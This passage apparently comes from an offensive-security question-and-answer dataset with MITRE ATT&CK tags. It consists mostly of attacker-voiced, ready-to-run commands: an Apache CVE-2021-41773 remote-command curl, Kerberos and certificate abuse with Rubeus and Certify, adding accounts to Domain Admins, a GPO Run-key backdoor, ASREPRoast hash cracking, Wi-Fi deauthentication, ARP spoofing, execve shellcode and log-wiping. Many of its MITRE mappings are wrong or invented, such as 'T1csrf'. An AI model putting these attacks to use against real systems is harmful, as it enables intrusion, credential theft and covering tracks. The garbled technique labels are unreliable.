A: To detect the underlying operating system in a command injection scenario, an attacker can leverage the 'git version' command. If the web application is running on a Windows system, the output of the 'git version' command will include the 'Windows' string, indicating a Windows-based environment. If the output only shows the Git version without the 'Windows' string, it suggests the web application is running on a Linux-based system. This information can help the attacker tailor their subsequent exploitation attempts to the specific operating system. MITRE References: MITRE ID is T1082, MITRE Name is: System Information Discovery, and MITRE Tactics are: Discovery.

## Q: What Python script can be used to exploit FastCGI?
A: You can use the Python script available at https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 to exploit FastCGI and execute arbitrary code on the server. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007.

## Q: How can the MS14-068 vulnerability be leveraged to escalate privileges on a Windows domain?
A: To leverage the MS14-068 vulnerability for privilege escalation on a Windows domain:1. Obtain the SID of the target user account using the 'rpcclient' tool. Run 'rpcclient -U <domain>\<username> <domain_controller_ip>' and then use the 'LOOKUPNAMES <username>' command to get the SID.2. Use PyKEK to generate a Kerberos ticket for the target user account by running 'python ms14-068.py -u <username>@<domain> -d <domain_controller_ip> -p <password> -s <SID>'. 3. Alternatively, use Impacket to exploit the vulnerability. Move the generated ticket to '/tmp/krb5cc_0' and run 'python goldenPac.py <domain>/<username>@<domain_controller_ip>' and enter the target user's password.4. The generated Kerberos ticket will provide the user with elevated privileges on the domain, allowing them to obtain the root/administrator flag. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you abuse trusted database links in MSSQL to execute commands?
A: You can use the following PowerShell commands to abuse trusted database links in MSSQL to execute commands:

```
# Look for MSSQL links of an accessible instance
Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0

# Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose

# Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"
``` MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: TA0006.

## Q: How can you create a setuid binary in a mounted directory to escalate privileges from the container to the host?
A: Mount a writable directory from the host using `-v /tmp:/host`. Then, create a `/bin/bash` binary with the setuid bit set in the mounted directory. This will allow you to execute the binary from the host and escalate to root. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0004.

## Q: How can you use the `--privileged` flag to remove isolation from a Docker container and escalate privileges?
A: The `--privileged` flag removes all the isolation from the container, allowing you to escalate privileges. Check techniques to escape from privileged containers as root. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: TA0004.

## Q: How can you create a malicious service worker to exploit a vulnerable web domain?
A: In order to exploit this vulnerability you need to find: a way to **upload arbitrary JS** files to the server and a **XSS to load the service worker** of the uploaded JS file, or a **vulnerable JSONP request** where you can **manipulate the output (with arbitrary JS code)** and a **XSS** to **load the JSONP with a payload** that will **load a malicious service worker**. The malicious service worker code would listen to the `fetch` event and send each fetched URL to the attacker's server. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can an attacker request and steal a certificate that allows domain authentication?
A: Using a tool named [Certify](https://github.com/GhostPack/Certify), one can search for valid certificates that enable persistent access with the command: `Certify.exe find /clientauth`. Certificates can be requested through a graphical interface using `certmgr.msc` or through the command line with `certreq.exe`. With Certify, the process to request a certificate is simplified as follows: `Certify.exe request /ca:CA-SERVER\CA-NAME /template:TEMPLATE-NAME`. Upon successful request, a certificate along with its private key is generated in `.pem` format. To convert this into a `.pfx` file, the following command is used: `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`. The `.pfx` file can then be uploaded to a target system and used with a tool called [Rubeus](https://github.com/GhostPack/Rubeus) to request a Ticket Granting Ticket (TGT) for the user: `Rubeus.exe asktgt /user:harmj0y /certificate:C:\Temp\cert.pfx /password:CertPass!`. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: TA0006.

## Q: How can an attacker extend their persistence through certificate renewal?
A: By renewing a certificate before its expiration, an attacker can maintain authentication to Active Directory without the need for additional ticket enrolments, which could leave traces on the Certificate Authority (CA) server. This approach allows for an extended persistence method, minimizing the risk of detection through fewer interactions with the CA server and avoiding the generation of artifacts that could alert administrators to the intrusion. MITRE References: MITRE ID is T1485, MITRE Name is: Data Destruction, and MITRE Tactics are: TA0040.

## Q: How can you change the email of a current session to take over an account?
A: From a report, the steps are:

1. Attacker requests to change his email with a new one
2. Attacker receives a link to confirm the change of the email
3. Attacker sends the victim the link so they click it
4. The victim's email is changed to the one indicated by the attacker
5. The attacker can then recover the password and take over the account MITRE References: MITRE ID is T1585.001, MITRE Name is: Establish Accounts, and MITRE Tactics are: Resource Development.

## Q: How can you use CORS misconfigurations to perform an account takeover?
A: If the page contains CORS misconfigurations, you might be able to steal sensitive information from the user to take over their account or make them change authentication information for the same purpose. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you use CSRF to perform an account takeover?
A: If the page is vulnerable to CSRF, you might be able to make the user modify their password, email or authentication so you can then access their account. MITRE References: MITRE ID is T1csrf, MITRE Name is: Cross-Site Request Forgery, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you use XSS to perform an account takeover?
A: If you find an XSS vulnerability in an application, you might be able to steal cookies, local storage, or information from the web page that could allow you to take over the account. MITRE References: MITRE ID is T1059.007, MITRE Name is: Command and Scripting Interpreter: JavaScript/JScript, and MITRE Tactics are: Execution.

## Q: How can you use response manipulation to perform an account takeover?
A: If the authentication response could be reduced to a simple boolean, try to change "false" to "true" and see if you get any access. MITRE References: MITRE ID is T1030, MITRE Name is: Data Manipulation, and MITRE Tactics are: Defense Evasion.

## Q: How can you use OAuth to perform an account takeover?
A: There is a section in the content about using OAuth to perform an account takeover, but no specific steps are provided. MITRE References: MITRE ID is T1811, MITRE Name is: Steal Application Access Token, and MITRE Tactics are: Credential Access.

## Q: How can you use host header injection to perform an account takeover?
A: The steps are:

1. The Host header is modified following a password reset request initiation.
2. The `X-Forwarded-For` proxy header is altered to `attacker.com`.
3. The Host, Referrer, and Origin headers are simultaneously changed to `attacker.com`.
4. After initiating a password reset and then opting to resend the mail, all three of the aforementioned methods are employed. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Web Shell, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you use response manipulation to perform an account takeover?
A: The steps are:

1. **Code Manipulation**: The status code is altered to `200 OK`.
2. **Code and Body Manipulation**:
   - The status code is changed to `200 OK`.
   - The response body is modified to `{"success":true}` or an empty object `{}`.
These manipulation techniques are effective in scenarios where JSON is utilized for data transmission and receipt. MITRE References: MITRE ID is T1030, MITRE Name is: Data Manipulation, and MITRE Tactics are: Defense Evasion.

## Q: How can an attacker with `GenericAll` rights on a user account perform targeted ASREPRoasting on the user?
A: The attacker can disable pre-authentication for the user, making their account vulnerable to ASREPRoasting.

Command:
```
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
``` MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: CredentialAccess, Lateral Movement, PrivilegeEscalation.

## Q: How can an attacker with `GenericAll` rights on a group like `Domain Admins` add themselves to the group?
A: The attacker can add themselves to the group using direct commands or using modules like Active Directory or PowerSploit.

Commands:
```
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
``` MITRE References: MITRE ID is T1136, MITRE Name is: Create Account, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can an attacker with `Self (Self-Membership)` rights on a group like `Domain Admins` add themselves to the group?
A: The attacker can add themselves to the `Domain Admins` group using the following command sequence:

```
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
``` MITRE References: MITRE ID is T1136, MITRE Name is: Create Account, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can an attacker enumerate the GPOs that a specific user has permissions to manage?
A: To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage:

```
powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
``` MITRE References: MITRE ID is T1484, MITRE Name is: Group Policy Modification, and MITRE Tactics are: Discovery, PrivilegeEscalation, Persistence.

## Q: How can an attacker use the GroupPolicy module to abuse GPOs and execute a backdoor on affected computers?
A: The GroupPolicy module, if installed, allows for the creation and linking of new GPOs, and setting preferences such as registry values to execute backdoors on affected computers. This method requires the GPO to be updated and a user to log in to the computer for execution:

```
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
``` MITRE References: MITRE ID is T1484, MITRE Name is: Group Policy Modification, and MITRE Tactics are: PrivilegeEscalation, Persistence.

## Q: How can you perform password spraying against an Active Directory environment?
A: Once you have obtained some valid usernames, you can attempt password spraying to try and compromise accounts. Some example commands are:

```
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
This will attempt to use the discovered administrator hash to login to other systems in the environment. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: TA0006.

## Q: How can you abuse unconstrained delegation in Active Directory to compromise a domain?
A: If you find any Computer object with the attribute `ADS_UF_TRUSTED_FOR_DELEGATION` and you have domain privileges on the computer, you will be able to dump Ticket Granting Tickets (TGTs) from memory of every user that logs into the computer. If a Domain Admin logs in, you can then use the dumped TGT to impersonate the Domain Admin user. MITRE References: MITRE ID is T1558.003, MITRE Name is: Steal or Forge Kerberos Tickets, and MITRE Tactics are: TA0006.

## Q: How can you abuse certificate templates in Active Directory Certificate Services to escalate privileges?
A: If there are vulnerable certificate templates configured, it is possible to abuse them to escalate privileges within the Active Directory environment. MITRE References: MITRE ID is T1055.004, MITRE Name is: Process Injection: PPID Spoofing, and MITRE Tactics are: TA0004, TA0005.

## Q: What is the simple exploit method for capturing printer credentials?
A: The exploit involves redirecting the LDAP server address to a controlled machine and leveraging the "Test Connection" feature to capture credentials. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: TA0011.

## Q: How can you use afl-clang-fast to bypass ASLR and find RCE vulnerabilities?
A: afl-clang-fast can be used to find vulnerabilities that allow bypassing Address Space Layout Randomization (ASLR) and achieving remote code execution (RCE). By compiling the target program with afl-clang-fast, the fuzzer can discover memory corruption issues that can lead to exploitable vulnerabilities. The coverage-guided fuzzing capabilities of afl-clang-fast can help identify weaknesses in the program's control flow and memory management that may be exploitable for RCE. afl-clang-fast version 2.58c. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you perform a deauthentication attack with aireplay-ng?
A: Run the deauthentication attack (`-0`), sending `5` packets to the wireless access point (`-a 8C:7F:3B:7E:81:B6`) to deauthenticate a wireless client (`-c 00:08:22:B9:41:A1`) via the monitor mode interface `wlan0mon`.

```console
root@kali:~# aireplay-ng -0 5 -a 8C:7F:3B:7E:81:B6 -c 00:08:22:B9:41:A1 wlan0mon
12:41:56  Waiting for beacon frame (BSSID: 8C:7F:3B:7E:81:B6) on channel 6
12:41:57  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
12:41:58  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
12:41:58  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
12:41:59  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
12:42:00  Sending 64 directed DeAuth. STMAC: [00:08:22:B9:41:A1] [ 0| 0 ACKs]
``` MITRE References: MITRE ID is T1499, MITRE Name is: Execution Denial of Service, and MITRE Tactics are: Impact.

## Q: How can you create an access point in Caffe Latte attack mode with airbase-ng?
A: As with the Hirte attack, the Caffe Latte Attack attempts to retrieve a WEP key via a client. This example creates an access point on channel 6 (`-c 6`) with the specified ESSID (`-e AlsoNotATrap`) and uses the Caffe Latte WEP attack (`-L`), setting the WEP flag in the beacons (`-W 1`).

```console
root@kali:~# airbase-ng -c 6 -e AlsoNotATrap -L -W 1 wlan0mon
15:56:05  Created tap interface at0
15:56:05  Trying to set MTU on at0 to 1500
15:56:05  Access Point with BSSID 3C:46:D8:4E:EF:AA started.
``` MITRE References: MITRE ID is T1098, MITRE Name is: Account Manipulation, and MITRE Tactics are: Credential Access, Defense Evasion.

## Q: How can airgeddon be used to perform wireless attacks?
A: airgeddon is a menu-driven wrapper tool that can be used to perform various wireless attacks. For example, in version 11.22, you can use airgeddon to perform PMKID capture attacks and crack pre-shared keys (PSK) of wireless networks using the aircrack-ng suite. To do this, select the "Wireless attacks" option from the main menu, then choose "PMKID capture attack" and follow the prompts to scan for and capture the necessary handshake data. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can airgeddon be used to perform wireless deauthentication attacks?
A: In version 11.22, airgeddon can be used to perform deauthentication attacks against wireless clients. From the main menu, select the "Wireless attacks" option, then choose "Deauthentication attack". This will allow you to scan for nearby wireless networks and clients, and then initiate a deauthentication attack to disconnect clients from the network. MITRE References: MITRE ID is T1499, MITRE Name is: Endpoint Denial of Service, and MITRE Tactics are: Impact.

## Q: How can amapcrap be used to generate random data to elicit responses from target ports during a pentest?
A: amapcrap is a tool that can be used to send random data to a target port in order to elicit a response, which can then be used with amap for future detection. To use amapcrap, you can run the following command to send random data to port 80 on the target 192.168.1.15:

root@kali:~# amapcrap -v 192.168.1.15 80

This will send a mix of null bytes, letters, and binary data to the target port. The -v flag enables verbose mode. The amapcrap version used in this example is 5.4. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can the Android SDK be leveraged to bypass security controls on Android devices?
A: The Android SDK can be used to bypass security controls on Android devices by creating apps that abuse platform APIs. For example, the SDK can be used to develop an app that escapes the app sandbox, gains root access, or exploits vulnerabilities in the Android framework. Version 22.0.1 of the Android SDK provides tools like the Android Emulator that can be used to test these types of malicious apps in a controlled environment. MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion.

## Q: How can you bypass biometric authentication in Android apps?
A: Use the following Frida script to bypass biometric authentication in Android apps:`frida --codeshare krapgras/android-biometric-bypass-update-android-11 -U -f <app.package>` MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: TA0004.

## Q: How can you modify the timestamps of files to avoid detection?
A: The `$STANDARD_INFORMATION` and `$FILE_NAME` attributes in NTFS store timestamp information such as modification, access, creation, and MFT registry modification (MACE or MACB). Tools like `TimeStomp` can be used to modify the timestamps in the `$STANDARD_INFORMATION` attribute, but the `$FILE_NAME` attribute will still show the original timestamps, allowing detection of suspicious activity. The `USN Journal` and `$LogFile` can also be used to identify changes to file metadata. MITRE References: MITRE ID is T1070.006, MITRE Name is: Indicator Removal on Host: Timestomp, and MITRE Tactics are: Defense Evasion.

## Q: How can you hide data in the slack space of NTFS file systems?
A: NTFS uses a cluster and the minimum information size. The remaining space in a cluster that is not used by a file is called slack space, and it is possible to hide data in this unused space. Tools like `slacker` can be used to hide data in this slack space. However, analyzing the `$LogFile` and `$UsnJrnl` can reveal that data has been added to the file system. MITRE References: MITRE ID is T1564.001, MITRE Name is: Hide Artifacts: Hidden Files and Directories, and MITRE Tactics are: Defense Evasion.

## Q: How can you disable various Windows logging mechanisms to make forensic investigation harder?
A: You can disable various Windows logging mechanisms, such as:- Disable UserAssist to remove dates and times when executables were run by the user.- Disable Prefetch to remove information about executed applications.- Disable Last Access Time to prevent updating of folder access timestamps.- Delete USB history by removing the USBSTOR registry key and the `setupapi.dev.log` file.- Disable and clear Windows event logs.- Disable the $UsnJrnl (Update Sequence Number Journal). MITRE References: MITRE ID is T1070.001, MITRE Name is: Indicator Removal on Host: Clear Windows Event Logs, and MITRE Tactics are: Defense Evasion.

## Q: How can you exploit the CVE-2021-41773 vulnerability in Apache?
A: To exploit the CVE-2021-41773 vulnerability in Apache, you can run the following command:

```
curl http://172.18.0.15/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh --data 'echo Content-Type: text/plain; echo; id; uname'
```

This will execute the `id` and `uname` commands on the server, revealing information about the user and system. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can you leverage the "Performance" subkey within the RpcEptMapper service registry to achieve a privilege escalation?
A: By creating a new "Performance" subkey within the RpcEptMapper service registry, you can potentially register a malicious DLL that will be loaded by the RPC Endpoint Mapper service. This DLL can implement the "OpenPerfData", "CollectPerfData", and "ClosePerfData" functions to execute arbitrary code under the LOCAL SYSTEM context, thus granting elevated privileges. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: TA0005, TA0003.

## Q: What is the process to execute the malicious DLL and achieve the privilege escalation?
A: The process to execute the malicious DLL and achieve the privilege escalation involves the following steps:1. Create a new "Performance" subkey within the RpcEptMapper service registry.2. Develop a proof-of-concept DLL that implements the "OpenPerfData", "CollectPerfData", and "ClosePerfData" functions.3. Test the DLL's functionality using the `rundll32` command.4. Execute WMI class queries related to Performance Data via PowerShell, which will result in the creation of a log file and the execution of the malicious DLL under the LOCAL SYSTEM context, granting elevated privileges. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: TA0005, TA0003.

## Q: How can the apple-bleee tool be used to leak data from Apple AirPods?
A: The apple-bleee tool includes the adv_airpods.py script which can be used to sniff and extract data from Apple AirPods. This script can be run as follows:

```
python3 adv_airpods.py
```

This script will scan for nearby AirPods and attempt to extract information such as the battery level, connection status, and other device details. The tool utilizes Bluetooth Low Energy (BLE) to communicate with the AirPods and does not require pairing or authentication. MITRE References: MITRE ID is T1185, MITRE Name is: Data from Connected Device, and MITRE Tactics are: Collection.

## Q: How can the apple-bleee tool be used to leak data from Apple devices using AirDrop?
A: The apple-bleee tool includes the airdrop_leak.py script which can be used to exploit the AirDrop feature on Apple devices to leak data. This script can be run as follows:

```
python3 airdrop_leak.py
```

This script will scan for nearby Apple devices with AirDrop enabled and attempt to extract information such as device names, phone numbers, email addresses, and other sensitive data. The tool utilizes the AWDL (Apple Wireless Direct Link) protocol to communicate with the target devices and does not require user interaction or authentication. MITRE References: MITRE ID is T1114, MITRE Name is: Email Collection, and MITRE Tactics are: Collection.

## Q: How can you print the stack canary value to bypass stack protection mechanisms?
A: To print the stack canary value and bypass stack protection mechanisms, you can use a vulnerability that allows you to leak the canary value, such as a format string vulnerability or a buffer overflow. Once you have the canary value, you can use it to overwrite the canary on the stack and bypass the stack protection. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: Collection.

## Q: How can you create a simple ARM64 shell code to execute /bin/sh on macOS?
A: Here's an example ARM64 shell code to execute /bin/sh on macOS:

```.section __TEXT,__text.global _main.align 2_main:    adr  x0, sh_path      mov  x1, xzr          mov  x2, xzr        mov  x16, #59         svc  #0x1337      sh_path: .asciz "/bin/sh"```This shell code performs the following steps:1. Loads the address of the string "/bin/sh" into x0.2. Clears x1 and x2 to pass NULL as the second and third arguments to execve().3. Moves the syscall number for execve (59) into x16.4. Makes the syscall using the svc #0x1337 instruction.The resulting shell code can be extracted and executed using a program that allocates executable memory and copies the shell code into it. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: TA0002.

## Q: How can Armitage be used to execute code on a compromised host and maintain persistent access?
A: Armitage's integration with Metasploit provides a wide range of post-exploitation capabilities for maintaining access and executing code on compromised systems. For example, Armitage v20220123 includes modules for deploying various payload types, such as Meterpreter and Powershell Empire, which can be used to establish persistent access. Additionally, the tool's 'Pivoting' feature allows the operator to use compromised hosts as jump-off points for further lateral movement and privilege escalation. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Persistence.

## Q: How can arping be used to perform ARP cache poisoning attacks?
A: arping version 2.24 can be used to perform ARP cache poisoning by sending unsolicited ARP replies to poison the ARP caches of hosts on the local network. The -U option can be used to send unsolicited ARP replies, and the -s and -t options can specify the source and target MAC addresses. For example, to poison the ARP cache of 192.168.1.100 with the MAC address 00:11:22:33:44:55:

```
arping -U -s 00:11:22:33:44:55 -t 192.168.1.100
```
This will cause 192.168.1.100 to associate the attacker's MAC address with its own IP address in its ARP cache, allowing the attacker to perform man-in-the-middle attacks. MITRE References: MITRE ID is T1558, MITRE Name is: Steal or Forge Credentials, and MITRE Tactics are: Credential Access.

## Q: How can you perform ARP spoofing to intercept network traffic?
A: Use the `arpspoof` command to perform ARP spoofing:```arpspoof -i wlan0 -t 192.168.1.1 192.168.1.105```* `-i` is the interface flag. In this example we choose the wlan0 interface. Run `ifconfig` to see which interfaces you have available.* `-t` the target flag. It specifies your target. The first address is the router, and the second is the specific device you want to target. MITRE References: MITRE ID is T1556, MITRE Name is: Modify Authentication Process, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can a vulnerability related to array indexing be exploited in a 64-bit binary with no NX?
A: In a 64-bit binary with no NX, a vulnerability related to array indexing can be exploited by overwriting a size to get a kind of buffer overflow where everything is going to be used a double number and sorted from smallest to biggest. It's needed to create a shellcode that fulfills that requirement, taking into account that the canary shouldn't be moved from its position. Then, the RIP can be overwritten with an address to `ret`, that fulfills the previous requirements, and putting the biggest address a new address pointing to the start of the stack (leaked by the program) so it's possible to use the `ret` to jump there. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004, Privilege Escalation.

## Q: How can one gain unauthorized access to Artifactory?
A: To gain unauthorized access to Artifactory, you can try techniques like brute-forcing the admin password, exploiting vulnerabilities in the web application, or abusing misconfigurations. Some common attack vectors include taking advantage of weak authentication, insecure file upload functionality, and unpatched software vulnerabilities. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can one escalate privileges in a compromised Artifactory instance?
A: To escalate privileges in a compromised Artifactory instance, you can try the following:- Search for known privilege escalation vulnerabilities in the software version- Abuse insecure file permissions or configurations to gain root/administrator access- Use tools like JukeboxPwner to scan for and exploit vulnerabilities in the Java Virtual Machine (JVM)- Utilize techniques like DLL hijacking or path traversal to bypass security controls MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: PrivilegeEscalation.

## Q: What kind of sensitive information can be extracted from a compromised Artifactory instance?
A: From a compromised Artifactory instance, you may be able to extract sensitive information such as:- Credentials (usernames and passwords) for Artifactory and connected systems- Metadata about the stored artifacts, which could reveal sensitive information- Configuration details about the Artifactory server and its environment- Access tokens or API keys that can be used to interact with the system- Data about the organization and its software development processes MITRE References: MITRE ID is T1552, MITRE Name is: Unsecured Credentials, and MITRE Tactics are: CredentialAccess.

## Q: How can one maintain persistent access to a compromised Artifactory instance?
A: To maintain persistent access to a compromised Artifactory instance, you can try the following:- Create a new user account with elevated privileges- Set up a webshell or backdoor that can be used for future access- Modify the Artifactory configuration to allow remote access or bypass security controls- Leverage scheduled tasks or cronjobs to execute malicious code on a regular basis MITRE References: MITRE ID is T1547, MITRE Name is: Boot or Logon Autostart Execution, and MITRE Tactics are: Persistence.

## Q: How can asleap be used to recover LEAP/PPTP passwords?
A: To use asleap to recover LEAP/PPTP passwords, you can follow these steps:

1. Generate a lookup file using the genkeys tool:
```console
root@kali:~# genkeys -r /usr/share/wordlists/nmap.lst -f asleap.dat -n asleap.idx
```
This will create the necessary files to perform the password recovery.

2. Run asleap on a captured LEAP exchange:
```console
root@kali:~# asleap -r leap.dump -f asleap.dat -n asleap.idx -s
Captured LEAP exchange information:
    username:          qa_leap
    challenge:         0786aea0215bc30a
    response:          7f6a14f11eeb980fda11bf83a142a8744f00683ad5bc5cb6
    hash bytes:        4a39
    NT hash:           a1fc198bdbf5833a56fb40cdd1a64a39
    password:          qaleap
```
This will attempt to recover the password from the captured LEAP exchange.

Alternatively, you can use asleap to crack a challenge and response directly:
```console
root@kali:~# asleap -C 58:16:d5:ac:4b:dc:e4:0f -R 50:ae:a3:0a:10:9e:28:f9:33:1b:44:b1:3d:9e:20:91:85:e8:2e:c3:c5:4c:00:23 -W password.lst
Using wordlist mode with "password.lst".
    hash bytes:        586c
    NT hash:           8846f7eaee8fb117ad06bdd830b7586c
    password:          password
```
This will use a provided wordlist to crack the challenge and response values. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can you bypass ASLR on 32-bit systems using brute-forcing techniques?
A: On 32-bit systems, the entropy in ASLR is relatively low, making it possible to bypass ASLR using brute-forcing techniques:

- If you have a big enough overflow to host a big NOP sled before the shellcode, you could just brute-force addresses in the stack until the flow jumps over some part of the NOP sled.
- If the exploit can be run locally, you can try to brute-force the base address of libc.
- If attacking a remote server, you could try to brute-force the address of the `usleep` libc function, checking for longer response times when the correct address is used. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you bypass ASLR on 64-bit systems using stack brute-forcing techniques?
A: On 64-bit systems, the entropy in ASLR is much higher, making brute-forcing more difficult. However, it's possible to occupy a large part of the stack with environment variables and then try to abuse the binary hundreds or thousands of times locally to find an address on the stack that contains a NOP instruction. This technique can bypass ASLR on 64-bit systems. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you use the `/proc/[pid]/stat` file to bypass ASLR?
A: The `/proc/[pid]/stat` file contains useful information that can be used to bypass ASLR, such as the addresses of the text, stack, data, and environment variables of a running process. If the attacker is on the same system as the vulnerable binary and the binary doesn't expect the overflow from raw arguments, the attacker can read this file to get some addresses and construct offsets for the exploit. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you bypass ASLR using a memory leak?
A: If you are given a memory leak (e.g., in an easy CTF challenge), you can calculate offsets from it, assuming you know the exact libc version used on the system you are exploiting. For example, you can use the leaked address of the `system` function to calculate the base address of libc and then use that to find the address of `/bin/sh` in libc to construct the exploit payload. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you bypass ASLR using a format string vulnerability?
A: If you have an arbitrary read vulnerability via a format string, it's possible to exfiltrate the address of a libc function from the Global Offset Table (GOT). This can then be used to calculate the base address of libc and construct the exploit payload accordingly. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: Collection.

## Q: How can you bypass ASLR using the `vsyscall` mechanism?
A: The `vsyscall` mechanism provides system calls that are executed in user space, and their addresses are not subject to ASLR. An attacker can use the fixed address of a `vsyscall` function, such as the start of a `syscall` instruction, to achieve code execution without needing to bypass ASLR for that part of the exploit. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you request the AS_REP message for vulnerable users to perform ASREPRoast?
A: Using Linux:
```
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
Using Windows:
```
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
``` MITRE References: MITRE ID is T1208, MITRE Name is: Kerberoasting, and MITRE Tactics are: CredentialAccess.

## Q: How can you crack the AS_REP messages to obtain the user's password?
A: ```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
``` MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can an attacker use atftp to perform a remote file transfer exploit?
A: The atftp client can be used to perform remote file transfers, which could potentially be used in a malicious way. For example, an attacker could use the `--get` or `--put` options to download or upload files to a remote system. This could be leveraged to exfiltrate data or perform remote code execution, depending on the configuration of the target system. Version 0.8.0-3 of atftp is being used in this example. MITRE References: MITRE ID is T1020, MITRE Name is: Automated Exfiltration, and MITRE Tactics are: Exfiltration.

## Q: How can an attacker leverage atftpd to set up a rogue TFTP server for a supply chain attack?
